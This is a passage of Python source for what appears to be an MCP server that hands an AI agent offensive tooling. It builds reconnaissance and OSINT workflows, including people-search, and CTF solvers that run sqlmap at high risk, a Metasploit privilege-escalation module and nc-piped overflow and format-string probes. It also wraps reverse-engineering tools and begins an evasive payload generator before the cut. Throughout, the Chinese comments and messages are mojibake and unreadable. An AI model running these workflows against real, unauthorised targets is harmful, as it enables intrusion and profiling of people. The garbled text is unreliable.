                    {"tool": "dnsrecon_scan", "params": {"domain": target_network}},
                    {"tool": "nuclei_network_scan", "params": {"target": target_network}}
                ]
            }
            workflow_steps.append(step3)

        return {
            "success": True,
            "workflow_name": "auto_network_discovery_workflow",
            "target_network": target_network,
            "scan_intensity": scan_intensity,
            "total_stages": len(workflow_steps),
            "workflow_steps": workflow_steps,
            "estimated_time": f"{len(workflow_steps) * 15}-{len(workflow_steps) * 30} minutes",
            "message": f"è‡ªåŠ¨åŒ–ç½‘ç»œå‘ç°å·¥ä½œæµå·²ç”Ÿæˆï¼Œç›®æ ‡ç½‘ç»œ: {target_network}"
        }

    @mcp.tool()
    def auto_osint_workflow(target_domain: str, scope: str = "comprehensive") -> Dict[str, Any]:
        """
        è‡ªåŠ¨åŒ–OSINTæƒ…æŠ¥æ”¶é›†å·¥ä½œæµ - å®Œæ•´çš„å¼€æºæƒ…æŠ¥æ”¶é›†ã€‚

        Args:
            target_domain: ç›®æ ‡åŸŸå
            scope: æ”¶é›†èŒƒå›´ (basic, comprehensive, extensive)

        Returns:
            OSINTæƒ…æŠ¥æ”¶é›†ç»“æœ
        """
        workflow_steps = []

        # ç¬¬ä¸€é˜¶æ®µï¼šåŸŸåæšä¸¾
        step1 = {
            "stage": "domain_enumeration",
            "description": "åŸŸåå’Œå­åŸŸåå‘ç°",
            "tools": [
                {"tool": "subfinder_scan", "params": {"domain": target_domain}},
                {"tool": "sublist3r_scan", "params": {"domain": target_domain}},
                {"tool": "amass_enum", "params": {"domain": target_domain, "mode": "enum"}}
            ]
        }
        workflow_steps.append(step1)

        # ç¬¬äºŒé˜¶æ®µï¼šDNSæšä¸¾
        step2 = {
            "stage": "dns_enumeration",
            "description": "DNSä¿¡æ¯æ”¶é›†",
            "tools": [
                {"tool": "dnsrecon_scan", "params": {"domain": target_domain}},
                {"tool": "dnsenum_scan", "params": {"domain": target_domain}},
                {"tool": "fierce_scan", "params": {"domain": target_domain}}
            ]
        }
        workflow_steps.append(step2)

        # ç¬¬ä¸‰é˜¶æ®µï¼šç¤¾äº¤åª’ä½“å’Œäººå‘˜ä¿¡æ¯
        if scope in ["comprehensive", "extensive"]:
            step3 = {
                "stage": "social_intelligence",
                "description": "ç¤¾äº¤åª’ä½“å’Œäººå‘˜ä¿¡æ¯æ”¶é›†",
                "tools": [
                    {"tool": "theharvester_osint", "params": {"domain": target_domain, "sources": "google,bing,linkedin,twitter"}},
                    {"tool": "sherlock_search", "params": {"username": target_domain.split('.')[0]}},
                    {"tool": "recon_ng_run", "params": {"module": "recon/domains-contacts/whois_pocs"}}
                ]
            }
            workflow_steps.append(step3)

        # ç¬¬å››é˜¶æ®µï¼šæŠ€æœ¯æŒ‡çº¹è¯†åˆ«
        if scope == "extensive":
            step4 = {
                "stage": "technology_fingerprinting",
                "description": "æŠ€æœ¯æ ˆå’ŒæœåŠ¡æŒ‡çº¹è¯†åˆ«",
                "tools": [
                    {"tool": "whatweb_identify", "params": {"target": f"http://{target_domain}"}},
                    {"tool": "nuclei_technology_detection", "params": {"target": f"http://{target_domain}"}},
                    {"tool": "httpx_probe", "params": {"targets": target_domain, "additional_args": "-tech-detect"}}
                ]
            }
            workflow_steps.append(step4)

        return {
            "success": True,
            "workflow_name": "auto_osint_workflow",
            "target_domain": target_domain,
            "scope": scope,
            "total_stages": len(workflow_steps),
            "workflow_steps": workflow_steps,
            "estimated_time": f"{len(workflow_steps) * 8}-{len(workflow_steps) * 15} minutes",
            "message": f"è‡ªåŠ¨åŒ–OSINTå·¥ä½œæµå·²ç”Ÿæˆï¼Œç›®æ ‡åŸŸå: {target_domain}"
        }

    # ==================== å¢å¼ºè‡ªåŠ¨åŒ–CTFæ±‚è§£åŠŸèƒ½ ====================

    @mcp.tool()
    def advanced_ctf_solver(target: str, challenge_info: Dict = None, time_limit: str = "30min") -> Dict[str, Any]:
        """
        é«˜çº§CTFé¢˜ç›®è‡ªåŠ¨æ±‚è§£å™¨ - åŸºäºé¢˜ç›®ç‰¹å¾çš„æ™ºèƒ½åŒ–æ”»å‡»ç­–ç•¥ã€‚

        Args:
            target: CTFé¢˜ç›®åœ°å€æˆ–IP
            challenge_info: é¢˜ç›®ä¿¡æ¯ (category, description, hintsç­‰)
            time_limit: æ—¶é—´é™åˆ¶

        Returns:
            CTFæ±‚è§£æ‰§è¡Œè®¡åˆ’å’Œç»“æœ
        """
        if not challenge_info:
            challenge_info = {}

        category = challenge_info.get("category", "unknown")
        description = challenge_info.get("description", "")
        hints = challenge_info.get("hints", [])

        # å¯ç”¨CTFæ¨¡å¼
        enable_ctf_mode()

        # åŸºäºé¢˜ç›®åˆ†ç±»ç”Ÿæˆæ±‚è§£ç­–ç•¥
        if category == "web" or "web" in description.lower():
            return ctf_web_comprehensive_solver(target, challenge_info, time_limit)
        elif category == "pwn" or "pwn" in description.lower():
            return ctf_pwn_solver(target, challenge_info, time_limit)
        elif category == "crypto" or "crypto" in description.lower():
            return ctf_crypto_solver(target, challenge_info, time_limit)
        elif category == "misc" or "misc" in description.lower():
            return ctf_misc_solver(target, challenge_info, time_limit)
        else:
            # é€šç”¨è‡ªåŠ¨æ£€æµ‹æ±‚è§£
            return ctf_auto_detect_solver(target, challenge_info, time_limit)

    @mcp.tool()
    def ctf_web_comprehensive_solver(target: str, challenge_info: Dict, time_limit: str) -> Dict[str, Any]:
        """Webç±»CTFé¢˜ç›®å…¨é¢æ±‚è§£å™¨"""
        solver_steps = []

        # ç¬¬ä¸€é˜¶æ®µï¼šåŸºç¡€ä¿¡æ¯æ”¶é›†
        step1 = {
            "phase": "reconnaissance",
            "description": "Webåº”ç”¨åŸºç¡€ä¿¡æ¯æ”¶é›†",
            "actions": [
                {"action": "technology_detection", "tool": "whatweb_scan", "params": {"target": target}},
                {"action": "directory_discovery", "tool": "gobuster_scan", "params": {"url": target, "wordlist": "/usr/share/wordlists/dirb/big.txt"}},
                {"action": "vulnerability_scan", "tool": "nuclei_web_scan", "params": {"target": target, "scan_type": "comprehensive"}}
            ]
        }
        solver_steps.append(step1)

        # ç¬¬äºŒé˜¶æ®µï¼šå¸¸è§Webæ¼æ´æ£€æµ‹
        step2 = {
            "phase": "vulnerability_detection",
            "description": "Webæ¼æ´æ·±åº¦æ£€æµ‹",
            "actions": [
                {"action": "sql_injection", "tool": "sqlmap_scan", "params": {"url": target, "additional_args": "--crawl=3 --batch --level=3 --risk=3"}},
                {"action": "file_upload", "tool": "ffuf_scan", "params": {"url": f"{target}/upload", "wordlist": "/usr/share/wordlists/dirb/extensions_common.txt"}},
                {"action": "lfi_rfi_test", "tool": "wfuzz_scan", "params": {"target": f"{target}?file=FUZZ", "wordlist": "/usr/share/wordlists/wfuzz/Injections/Traversal.txt"}}
            ]
        }
        solver_steps.append(step2)

        # ç¬¬ä¸‰é˜¶æ®µï¼šCTFç‰¹å®šæ”»å‡»
        step3 = {
            "phase": "ctf_specific_attacks",
            "description": "CTFç¯å¢ƒç‰¹å®šæ”»å‡»æ–¹æ³•",
            "actions": [
                {"action": "source_code_analysis", "tool": "gobuster_scan", "params": {"url": target, "mode": "dir", "additional_args": "-x php,txt,bak,old,zip"}},
                {"action": "hidden_parameters", "tool": "wfuzz_scan", "params": {"target": f"{target}?FUZZ=test", "wordlist": "/usr/share/wordlists/wfuzz/general/common.txt"}},
                {"action": "admin_panel_discovery", "tool": "feroxbuster_scan", "params": {"url": target, "wordlist": "/usr/share/wordlists/dirb/admin.txt"}}
            ]
        }
        solver_steps.append(step3)

        return {
            "success": True,
            "solver_type": "ctf_web_comprehensive",
            "target": target,
            "time_limit": time_limit,
            "challenge_category": "web",
            "total_phases": len(solver_steps),
            "solver_steps": solver_steps,
            "auto_flag_detection": True,
            "message": f"CTF Webé¢˜ç›®å…¨é¢æ±‚è§£å™¨å·²å¯åŠ¨ï¼Œç›®æ ‡: {target}"
        }

    @mcp.tool()
    def ctf_pwn_solver(target: str, challenge_info: Dict, time_limit: str) -> Dict[str, Any]:
        """Pwnç±»CTFé¢˜ç›®æ±‚è§£å™¨"""
        solver_steps = []

        # ç¬¬ä¸€é˜¶æ®µï¼šæœåŠ¡è¯†åˆ«
        step1 = {
            "phase": "service_identification",
            "description": "PwnæœåŠ¡è¯†åˆ«å’Œåˆ†æ",
            "actions": [
                {"action": "port_scan", "tool": "nmap_scan", "params": {"target": target, "scan_type": "-sV -sC"}},
                {"action": "service_banner", "tool": "nmap_scan", "params": {"target": target, "additional_args": "--script banner"}},
                {"action": "vulnerability_scan", "tool": "nuclei_scan", "params": {"target": target, "templates": "network/"}}
            ]
        }
        solver_steps.append(step1)

        # ç¬¬äºŒé˜¶æ®µï¼šæ¼æ´æ¢æµ‹
        step2 = {
            "phase": "vulnerability_probing",
            "description": "äºŒè¿›åˆ¶æ¼æ´æ¢æµ‹",
            "actions": [
                {"action": "buffer_overflow_test", "tool": "execute_command", "params": {"command": f"echo 'A'*1000 | nc {target.split(':')[0]} {target.split(':')[1] if ':' in target else '22'}"}},
                {"action": "format_string_test", "tool": "execute_command", "params": {"command": f"echo '%x%x%x%x' | nc {target.split(':')[0]} {target.split(':')[1] if ':' in target else '22'}"}},
                {"action": "shellcode_injection", "tool": "metasploit_run", "params": {"module": "exploit/linux/misc/glibc_ld_audit_dso_load_priv_esc"}}
            ]
        }
        solver_steps.append(step2)

        return {
            "success": True,
            "solver_type": "ctf_pwn",
            "target": target,
            "time_limit": time_limit,
            "challenge_category": "pwn",
            "total_phases": len(solver_steps),
            "solver_steps": solver_steps,
            "auto_flag_detection": True,
            "message": f"CTF Pwné¢˜ç›®æ±‚è§£å™¨å·²å¯åŠ¨ï¼Œç›®æ ‡: {target}"
        }

    @mcp.tool()
    def ctf_crypto_solver(target: str, challenge_info: Dict, time_limit: str) -> Dict[str, Any]:
        """Cryptoç±»CTFé¢˜ç›®æ±‚è§£å™¨"""
        solver_steps = []

        # ç¬¬ä¸€é˜¶æ®µï¼šå¯†ç å­¦åˆ†æ
        step1 = {
            "phase": "cryptographic_analysis",
            "description": "å¯†ç å­¦ç®—æ³•è¯†åˆ«å’Œåˆ†æ",
            "actions": [
                {"action": "hash_identification", "tool": "execute_command", "params": {"command": "hashid"}},
                {"action": "cipher_detection", "tool": "execute_command", "params": {"command": "cipher-identifier"}},
                {"action": "frequency_analysis", "tool": "execute_command", "params": {"command": "freq-analysis"}}
            ]
        }
        solver_steps.append(step1)

        # ç¬¬äºŒé˜¶æ®µï¼šè§£å¯†å°è¯•
        step2 = {
            "phase": "decryption_attempts",
            "description": "è‡ªåŠ¨åŒ–è§£å¯†å°è¯•",
            "actions": [
                {"action": "common_ciphers", "tool": "execute_command", "params": {"command": "cyberchef-cli"}},
                {"action": "hash_cracking", "tool": "john_crack", "params": {"hash_file": "/tmp/hashes.txt"}},
                {"action": "rsa_attacks", "tool": "execute_command", "params": {"command": "rsatool"}}
            ]
        }
        solver_steps.append(step2)

        return {
            "success": True,
            "solver_type": "ctf_crypto",
            "target": target,
            "time_limit": time_limit,
            "challenge_category": "crypto",
            "total_phases": len(solver_steps),
            "solver_steps": solver_steps,
            "auto_flag_detection": True,
            "message": f"CTF Cryptoé¢˜ç›®æ±‚è§£å™¨å·²å¯åŠ¨ï¼Œç›®æ ‡: {target}"
        }

    @mcp.tool()
    def ctf_misc_solver(target: str, challenge_info: Dict, time_limit: str) -> Dict[str, Any]:
        """Miscç±»CTFé¢˜ç›®æ±‚è§£å™¨"""
        solver_steps = []

        # ç¬¬ä¸€é˜¶æ®µï¼šæ–‡ä»¶åˆ†æ
        step1 = {
            "phase": "file_analysis",
            "description": "æ–‡ä»¶æ ¼å¼åˆ†æå’Œéšå†™æ£€æµ‹",
            "actions": [
                {"action": "file_type_detection", "tool": "execute_command", "params": {"command": "file"}},
                {"action": "steganography_detection", "tool": "execute_command", "params": {"command": "steghide"}},
                {"action": "metadata_extraction", "tool": "execute_command", "params": {"command": "exiftool"}}
            ]
        }
        solver_steps.append(step1)

        # ç¬¬äºŒé˜¶æ®µï¼šæ•°æ®æ¢å¤
        step2 = {
            "phase": "data_recovery",
            "description": "æ•°æ®æ¢å¤å’Œéšè—ä¿¡æ¯æå–",
            "actions": [
                {"action": "deleted_files", "tool": "execute_command", "params": {"command": "photorec"}},
                {"action": "memory_analysis", "tool": "execute_command", "params": {"command": "volatility"}},
                {"action": "network_analysis", "tool": "tshark_capture", "params": {"interface": "any"}}
            ]
        }
        solver_steps.append(step2)

        return {
            "success": True,
            "solver_type": "ctf_misc",
            "target": target,
            "time_limit": time_limit,
            "challenge_category": "misc",
            "total_phases": len(solver_steps),
            "solver_steps": solver_steps,
            "auto_flag_detection": True,
            "message": f"CTF Miscé¢˜ç›®æ±‚è§£å™¨å·²å¯åŠ¨ï¼Œç›®æ ‡: {target}"
        }

    @mcp.tool()
    def ctf_auto_detect_solver(target: str, challenge_info: Dict, time_limit: str) -> Dict[str, Any]:
        """CTFé¢˜ç›®è‡ªåŠ¨æ£€æµ‹æ±‚è§£å™¨"""
        # é¦–å…ˆè¿›è¡Œç›®æ ‡åˆ†æ
        analysis_result = analyze_target_intelligence(target)

        # åŸºäºåˆ†æç»“æœå†³å®šæ±‚è§£ç­–ç•¥
        if "web" in analysis_result.get("target_type", ""):
            return ctf_web_comprehensive_solver(target, challenge_info, time_limit)
        elif analysis_result.get("analysis_summary", {}).get("ssh_available"):
            return ctf_pwn_solver(target, challenge_info, time_limit)
        else:
            # é»˜è®¤ç»¼åˆæ±‚è§£ç­–ç•¥
            return {
                "success": True,
                "solver_type": "ctf_auto_detect",
                "target": target,
                "detected_type": analysis_result.get("target_type", "unknown"),
                "recommended_approach": "manual_analysis",
                "analysis_result": analysis_result,
                "message": f"CTFé¢˜ç›®è‡ªåŠ¨æ£€æµ‹å®Œæˆï¼Œå»ºè®®é‡‡ç”¨æ‰‹åŠ¨åˆ†ææ–¹æ³•"
            }

    # ==================== IDA é€†å‘å·¥ç¨‹å·¥å…· ====================

    @mcp.tool()
    def reverse_tool_check() -> Dict[str, Any]:
        """
        æ£€æŸ¥å¯ç”¨çš„é€†å‘åˆ†æå·¥å…· - æ£€æµ‹æœ¬æœºé€†å‘å·¥ç¨‹å·¥å…·

        Returns:
            å¯ç”¨çš„é€†å‘åˆ†æå·¥å…·çŠ¶æ€
        """
        available_tools = {}

        # æ£€æŸ¥Radare2
        try:
            import subprocess
            result = subprocess.run(["r2", "-version"], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                available_tools["radare2"] = {
                    "available": True,
                    "version": result.stdout.strip()
                }
            else:
                available_tools["radare2"] = {"available": False}
        except:
            available_tools["radare2"] = {"available": False}

        # æ£€æŸ¥Ghidra
        try:
            import os
            ghidra_paths = [
                "C:\\ghidra\\support\\analyzeHeadless.bat",
                "C:\\Program Files\\ghidra\\support\\analyzeHeadless.bat",
                "/usr/bin/ghidra",
                "/opt/ghidra/support/analyzeHeadless"
            ]
            ghidra_available = any(os.path.exists(path) for path in ghidra_paths)
            available_tools["ghidra"] = {"available": ghidra_available}
        except:
            available_tools["ghidra"] = {"available": False}

        # æ£€æŸ¥Cutter (Radare2 GUI)
        try:
            import subprocess
            result = subprocess.run(["cutter", "--version"], capture_output=True, text=True, timeout=5)
            available_tools["cutter"] = {
                "available": result.returncode == 0,
                "version": result.stdout.strip() if result.returncode == 0 else None
            }
        except:
            available_tools["cutter"] = {"available": False}

        return {
            "success": True,
            "available_tools": available_tools,
            "recommendation": "radare2" if available_tools["radare2"]["available"]
                           else "ghidra" if available_tools["ghidra"]["available"]
                           else "è¯·å®‰è£…é€†å‘åˆ†æå·¥å…·"
        }


    @mcp.tool()
    def radare2_analyze_binary(binary_path: str) -> Dict[str, Any]:
        """
        ä½¿ç”¨Radare2åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶ - å¼€æºé€†å‘åˆ†æå·¥å…·

        Args:
            binary_path: äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„

        Returns:
            Radare2åˆ†æç»“æœï¼ŒåŒ…å«å‡½æ•°ã€å­—ç¬¦ä¸²ã€å¯¼å…¥å¯¼å‡ºç­‰ä¿¡æ¯
        """
        try:
            import subprocess
            import json

            results = {
                "binary_path": binary_path,
                "analysis_steps": {},
                "functions": [],
                "strings": [],
                "imports": [],
                "symbols": []
            }

            # åŸºç¡€ä¿¡æ¯åˆ†æ
            info_cmd = ["r2", "-q", "-c", "ij", binary_path]
            info_result = subprocess.run(info_cmd, capture_output=True, text=True, timeout=30)
            if info_result.returncode == 0:
                try:
                    info_data = json.loads(info_result.stdout)
                    results["binary_info"] = info_data
                except:
                    results["binary_info"] = {"raw_output": info_result.stdout}

            # è‡ªåŠ¨åˆ†æ
            analyze_cmd = ["r2", "-q", "-A", "-c", "aflj", binary_path]
            func_result = subprocess.run(analyze_cmd, capture_output=True, text=True, timeout=60)
            if func_result.returncode == 0:
                try:
                    func_data = json.loads(func_result.stdout)
                    results["functions"] = func_data
                except:
                    results["functions"] = []

            # å­—ç¬¦ä¸²æå–
            strings_cmd = ["r2", "-q", "-c", "izj", binary_path]
            str_result = subprocess.run(strings_cmd, capture_output=True, text=True, timeout=30)
            if str_result.returncode == 0:
                try:
                    str_data = json.loads(str_result.stdout)
                    results["strings"] = str_data
                except:
                    results["strings"] = []

            # å¯¼å…¥å‡½æ•°
            imports_cmd = ["r2", "-q", "-c", "iij", binary_path]
            imp_result = subprocess.run(imports_cmd, capture_output=True, text=True, timeout=30)
            if imp_result.returncode == 0:
                try:
                    imp_data = json.loads(imp_result.stdout)
                    results["imports"] = imp_data
                except:
                    results["imports"] = []

            results["success"] = True
            results["tool"] = "radare2"
            return results

        except Exception as e:
            return {
                "success": False,
                "error": f"Radare2åˆ†æå¤±è´¥: {str(e)}",
                "suggestion": "è¯·ç¡®ä¿å·²å®‰è£…Radare2: https://rada.re/"
            }

    @mcp.tool()
    def ghidra_analyze_binary(binary_path: str) -> Dict[str, Any]:
        """
        ä½¿ç”¨Ghidraåˆ†æäºŒè¿›åˆ¶æ–‡ä»¶ - NSAå¼€æºé€†å‘åˆ†æå·¥å…·

        Args:
            binary_path: äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„

        Returns:
            Ghidraåˆ†æç»“æœ
        """
        try:
            import subprocess
            import tempfile
            import os

            # åˆ›å»ºä¸´æ—¶é¡¹ç›®ç›®å½•
            with tempfile.TemporaryDirectory() as temp_dir:
                project_dir = os.path.join(temp_dir, "ghidra_project")

                # Ghidraæ— å¤´åˆ†æå‘½ä»¤
                ghidra_paths = [
                    "C:\\ghidra\\support\\analyzeHeadless.bat",
                    "/opt/ghidra/support/analyzeHeadless"
                ]

                ghidra_cmd = None
                for path in ghidra_paths:
                    if os.path.exists(path):
                        ghidra_cmd = path
                        break

                if not ghidra_cmd:
                    return {
                        "success": False,
                        "error": "Ghidraæœªæ‰¾åˆ°",
                        "suggestion": "è¯·å®‰è£…Ghidra: https://ghidra-sre.org/"
                    }

                # æ‰§è¡ŒGhidraåˆ†æ
                cmd = [
                    ghidra_cmd,
                    project_dir,
                    "temp_project",
                    "-import", binary_path,
                    "-postScript", "ListFunctionsScript.java"
                ]

                result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

                return {
                    "success": result.returncode == 0,
                    "tool": "ghidra",
                    "binary_path": binary_path,
                    "output": result.stdout,
                    "error": result.stderr if result.returncode != 0 else None
                }

        except Exception as e:
            return {
                "success": False,
                "error": f"Ghidraåˆ†æå¤±è´¥: {str(e)}"
            }

    @mcp.tool()
    def auto_reverse_analyze(binary_path: str) -> Dict[str, Any]:
        """
        è‡ªåŠ¨é€‰æ‹©å¯ç”¨å·¥å…·è¿›è¡Œé€†å‘åˆ†æ - æ™ºèƒ½å·¥å…·é€‰æ‹©

        Args:
            binary_path: äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„

        Returns:
            è‡ªåŠ¨åˆ†æç»“æœï¼Œä½¿ç”¨æœ€ä½³å¯ç”¨å·¥å…·
        """
        # æ£€æŸ¥å¯ç”¨å·¥å…·
        tool_status = reverse_tool_check()
        available = tool_status.get("available_tools", {})

        results = {
            "binary_path": binary_path,
            "attempted_tools": [],
            "successful_analysis": None,
            "all_results": {}
        }

        # ä¼˜å…ˆçº§ï¼šRadare2 > Ghidra (ç§»é™¤IDA Pro)
        if available.get("radare2", {}).get("available"):
            try:
                r2_result = radare2_analyze_binary(binary_path)
                results["attempted_tools"].append("radare2")
                results["all_results"]["radare2"] = r2_result
                if r2_result.get("success"):
                    results["successful_analysis"] = "radare2"
                    results["primary_result"] = r2_result
                    return results
            except:
                pass

        if available.get("ghidra", {}).get("available"):
            try:
                ghidra_result = ghidra_analyze_binary(binary_path)
                results["attempted_tools"].append("ghidra")
                results["all_results"]["ghidra"] = ghidra_result
                if ghidra_result.get("success"):
                    results["successful_analysis"] = "ghidra"
                    results["primary_result"] = ghidra_result
                    return results
            except:
                pass

        # å¦‚æœæ‰€æœ‰å·¥å…·éƒ½å¤±è´¥
        results["success"] = False
        results["error"] = "æ‰€æœ‰é€†å‘åˆ†æå·¥å…·éƒ½ä¸å¯ç”¨æˆ–åˆ†æå¤±è´¥"
        results["suggestion"] = "è¯·å®‰è£…ä»¥ä¸‹å·¥å…·ä¹‹ä¸€ï¼šIDA Pro, Radare2, Ghidra"
        return results

    @mcp.tool()
    def ctf_reverse_solver(binary_path: str, challenge_hints: List[str] = None) -> Dict[str, Any]:
        """
        CTFé€†å‘é¢˜ç›®è‡ªåŠ¨æ±‚è§£å™¨ - ç»¼åˆä½¿ç”¨å¤šç§é€†å‘åˆ†ææŠ€æœ¯

        Args:
            binary_path: é¢˜ç›®äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„
            challenge_hints: é¢˜ç›®æç¤ºä¿¡æ¯åˆ—è¡¨ï¼ˆå¯é€‰ï¼‰

        Returns:
            é€†å‘åˆ†æç»“æœå’Œå¯èƒ½çš„Flag
        """
        if not challenge_hints:
            challenge_hints = []

        results = {
            "binary_path": binary_path,
            "challenge_hints": challenge_hints,
            "analysis_steps": {},
            "findings": [],
            "potential_flags": []
        }

        try:
            # æ­¥éª¤1ï¼šæ£€æŸ¥IDAæœåŠ¡å™¨
            logger.info("æ­¥éª¤1ï¼šæ£€æŸ¥IDAæœåŠ¡å™¨çŠ¶æ€")
            ida_status = ida_check_server()
            results["analysis_steps"]["1_ida_server_check"] = ida_status

            if not ida_status.get("ida_available", False):
                return {
                    "success": False,
                    "error": "IDAæœåŠ¡å™¨ä¸å¯ç”¨ï¼Œè¯·å…ˆå¯åŠ¨IDA Proå¹¶åŠ è½½MCPæ’ä»¶",
                    "results": results
                }

            # æ­¥éª¤2ï¼šå…¨é¢äºŒè¿›åˆ¶åˆ†æ
            logger.info("æ­¥éª¤2ï¼šæ‰§è¡Œå…¨é¢äºŒè¿›åˆ¶åˆ†æ")
            binary_analysis = ida_analyze_binary(binary_path)
            results["analysis_steps"]["2_binary_analysis"] = binary_analysis

            # æ­¥éª¤3ï¼šåŠ å¯†æ¨¡å¼æ£€æµ‹
            logger.info("æ­¥éª¤3ï¼šæœç´¢åŠ å¯†ç®—æ³•æ¨¡å¼")
            crypto_patterns = ida_find_crypto_patterns()
            results["analysis_steps"]["3_crypto_detection"] = crypto_patterns

            # æ­¥éª¤4ï¼šå­—ç¬¦ä¸²åˆ†æ
            logger.info("æ­¥éª¤4ï¼šæå–å’Œåˆ†æå­—ç¬¦ä¸²")
            strings_analysis = ida_extract_strings_with_xrefs()
            results["analysis_steps"]["4_strings_analysis"] = strings_analysis

            # åˆ†æç»“æœï¼ŒæŸ¥æ‰¾å¯èƒ½çš„Flag
            if strings_analysis.get("success"):
                strings_data = strings_analysis.get("strings_analysis", {}).get("strings", [])
                for string_info in strings_data:
                    string_value = string_info.get("value", "")
                    # æ£€æŸ¥å¸¸è§çš„CTF Flagæ ¼å¼
                    if any(pattern in string_value.lower() for pattern in ["flag{", "ctf{", "picoctf{", "hackthebox}"]):
                        results["potential_flags"].append({
                            "flag": string_value,
                            "address": string_info.get("address"),
                            "source": "string_analysis"
                        })

            # æ­¥éª¤5ï¼šæ™ºèƒ½åˆ†æ
            logger.info("æ­¥éª¤5ï¼šæ‰§è¡Œæ™ºèƒ½é€†å‘åˆ†æ")

            # ç”Ÿæˆé’ˆå¯¹æ€§åˆ†æè„šæœ¬
            analysis_script = '''
import idautils
import idc
import idaapi

def smart_ctf_analysis():
    findings = []

    # æŸ¥æ‰¾mainå‡½æ•°
    main_func = ida_name.get_name_ea(idaapi.BADADDR, "main")
    if main_func != idaapi.BADADDR:
        findings.append({"type": "main_function", "address": hex(main_func)})

    # æŸ¥æ‰¾å¯ç–‘çš„ç³»ç»Ÿè°ƒç”¨
    suspicious_calls = ["system", "execve", "popen", "printf", "scanf", "gets", "strcmp"]
    for call in suspicious_calls:
        addr = ida_name.get_name_ea(idaapi.BADADDR, call)
        if addr != idaapi.BADADDR:
            findings.append({"type": "suspicious_call", "function": call, "address": hex(addr)})

    # æŸ¥æ‰¾å¯ç–‘çš„å­—ç¬¦ä¸²æ¯”è¾ƒ
    for func_ea in idautils.Functions():
        func_name = ida_funcs.get_func_name(func_ea)
        if "check" in func_name.lower() or "verify" in func_name.lower() or "validate" in func_name.lower():
            findings.append({"type": "validation_function", "name": func_name, "address": hex(func_ea)})

    return findings

smart_ctf_analysis()
'''

            smart_analysis = ida_execute_custom_script(analysis_script)
            results["analysis_steps"]["5_smart_analysis"] = smart_analysis

            results["success"] = True
            results["summary"] = {
                "total_functions": len(binary_analysis.get("analysis", {}).get("functions", [])),
                "total_strings": len(strings_data) if 'strings_data' in locals() else 0,
                "crypto_patterns_found": len(crypto_patterns.get("crypto_analysis", {}).get("crypto_patterns", [])),
                "potential_flags_found": len(results["potential_flags"])
            }

            return results

        except Exception as e:
            logger.error(f"CTFé€†å‘æ±‚è§£å™¨é”™è¯¯: {str(e)}")
            results["success"] = False
            results["error"] = str(e)
            return results

    @mcp.tool()
    def ctf_crypto_reverser(binary_path: str, encrypted_data: str = "") -> Dict[str, Any]:
        """
        CTFå¯†ç å­¦é€†å‘ä¸“ç”¨å·¥å…· - ä¸“é—¨è§£å†³å¯†ç å­¦ç›¸å…³çš„é€†å‘é¢˜ç›®

        Args:
            binary_path: åŒ…å«åŠ å¯†ç®—æ³•çš„äºŒè¿›åˆ¶æ–‡ä»¶
            encrypted_data: åŠ å¯†çš„æ•°æ®ï¼ˆå¯é€‰ï¼‰

        Returns:
            å¯†ç å­¦é€†å‘åˆ†æç»“æœï¼ŒåŒ…å«ç®—æ³•è¯†åˆ«å’Œè§£å¯†å°è¯•
        """
        results = {
            "binary_path": binary_path,
            "encrypted_data": encrypted_data,
            "crypto_findings": [],
            "decryption_attempts": [],
            "algorithm_analysis": {}
        }

        try:
            # æ£€æŸ¥IDAæœåŠ¡å™¨
            if not ida_check_server().get("ida_available", False):
                return {"success": False, "error": "IDAæœåŠ¡å™¨ä¸å¯ç”¨"}

            # æ‰§è¡Œå¯†ç å­¦æ¨¡å¼æœç´¢
            crypto_analysis = ida_find_crypto_patterns()
            results["algorithm_analysis"] = crypto_analysis

            # æ‰§è¡Œä¸“é—¨çš„å¯†ç å­¦é€†å‘è„šæœ¬
            crypto_reverse_script = '''
import idautils
import idc
import idaapi
import ida_bytes

def advanced_crypto_analysis():
    findings = []

    # æœç´¢XORæ“ä½œ
    for func_ea in idautils.Functions():
        func = idaapi.get_func(func_ea)
        if not func:
            continue

        ea = func.start_ea
        while ea < func.end_ea:
            if idc.print_insn_mnem(ea) == "xor":
                findings.append({
                    "type": "xor_operation",
                    "address": hex(ea),
                    "function": ida_funcs.get_func_name(func_ea),
                    "instruction": idc.GetDisasm(ea)
                })
            ea = idc.next_head(ea)

    # æœç´¢ä½æ“ä½œå’Œç§»ä½
    shift_ops = ["shl", "shr", "rol", "ror"]
    for func_ea in idautils.Functions():
        func = idaapi.get_func(func_ea)
        if not func:
            continue

        ea = func.start_ea
        while ea < func.end_ea:
            mnem = idc.print_insn_mnem(ea)
            if mnem in shift_ops:
                findings.append({
                    "type": "bit_operation",
                    "operation": mnem,
                    "address": hex(ea),
                    "function": ida_funcs.get_func_name(func_ea)
                })
            ea = idc.next_head(ea)

    # æŸ¥æ‰¾å¾ªç¯ç»“æ„ï¼ˆå¯èƒ½çš„åŠ å¯†å¾ªç¯ï¼‰
    for func_ea in idautils.Functions():
        func_name = ida_funcs.get_func_name(func_ea)
        if any(word in func_name.lower() for word in ["encrypt", "decrypt", "cipher", "hash"]):
            findings.append({
                "type": "crypto_function",
                "name": func_name,
                "address": hex(func_ea)
            })

    return findings

advanced_crypto_analysis()
'''

            crypto_script_result = ida_execute_custom_script(crypto_reverse_script)
            results["crypto_findings"] = crypto_script_result

            results["success"] = True
            return results

        except Exception as e:
            logger.error(f"å¯†ç å­¦é€†å‘åˆ†æé”™è¯¯: {str(e)}")
            results["success"] = False
            results["error"] = str(e)
            return results

    # ==================== æ™ºèƒ½Payloadç”Ÿæˆå™¨å·¥å…· ====================

    @mcp.tool()
    def generate_intelligent_payload(vulnerability_type: str, target_info: Dict = None,
                                   evasion_level: str = "medium", quantity: int = 5) -> Dict[str, Any]:
        """
        æ™ºèƒ½ç”Ÿæˆé’ˆå¯¹ç‰¹å®šæ¼æ´çš„Payload - AIé©±åŠ¨çš„Payloadè‡ªåŠ¨ç”Ÿæˆå’Œå˜å¼‚ã€‚

        Args:
            vulnerability_type: æ¼æ´ç±»å‹ (sql_injection, xss, command_injection, lfi, rce, xxe, deserialization)
            target_info: ç›®æ ‡ä¿¡æ¯ (platform, operating_system, application, waf_typeç­‰)
            evasion_level: è§„é¿çº§åˆ« (low, medium, high)
            quantity: ç”Ÿæˆæ•°é‡ (1-20)

